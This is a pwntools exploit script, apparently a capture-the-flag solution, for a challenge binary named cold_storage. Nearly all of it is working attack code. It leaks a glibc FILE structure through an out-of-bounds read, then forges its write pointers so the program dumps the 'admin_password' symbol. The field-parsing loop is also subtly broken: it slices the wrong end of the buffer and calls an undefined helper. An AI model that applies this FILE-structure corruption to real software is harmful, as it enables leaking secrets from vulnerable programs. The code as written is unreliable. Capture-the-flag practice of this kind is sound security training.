#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../artifacts/cold_storage --host cold_storage --port 2000
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./cold_simple")
# exe = context.binary = ELF("./cold_sanitized")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "chall"
port = int(args.PORT or 2000)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak *0x{exe.entry:x}
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

CREATE_MEMORY = 1
WRITE_MEMORY = 2
READ_MEMORY = 3
CREATE_FILE = 4
WRITE_FILE = 5

io = start()

io.sendlineafter(b">", f"{CREATE_FILE}".encode())
io.sendlineafter(b"Index", b"0")

io.sendlineafter(b">", f"{READ_MEMORY}".encode())
io.sendlineafter(b"Index", b"16")
io.recvuntil(b"Data: ")

data: bytes = io.recvline()

file_struct_data = bytes.fromhex(data.decode().strip())
assert len(file_struct_data) == 216

print(file_struct_data)

fp = FileStructure()
field_sizes = update_var(8)

# print(field_sizes)

for key, size in field_sizes.items():
    fp.__setattr__(key, unpack(file_struct_data[:size], "all"))
    file_struct_data = file_struct_data[:size]

fp.flags &= ~0x8
fp.flags |= 0x800
fp._IO_write_base = exe.symbols["admin_password"]
fp._IO_write_ptr = exe.symbols["admin_password"] + 100
fp._IO_read_end = fp._IO_write_base
fp.fileno = 1

io.sendlineafter(b">", f"{WRITE_MEMORY}".encode())
io.sendlineafter(b"Index", b"16")
io.recvuntil(b"Data: ")

io.send(bytes(fp)[:0xD8])

io.sendline(b"caca")
io.recvuntil(b"Invalid choice\n")

io.close()
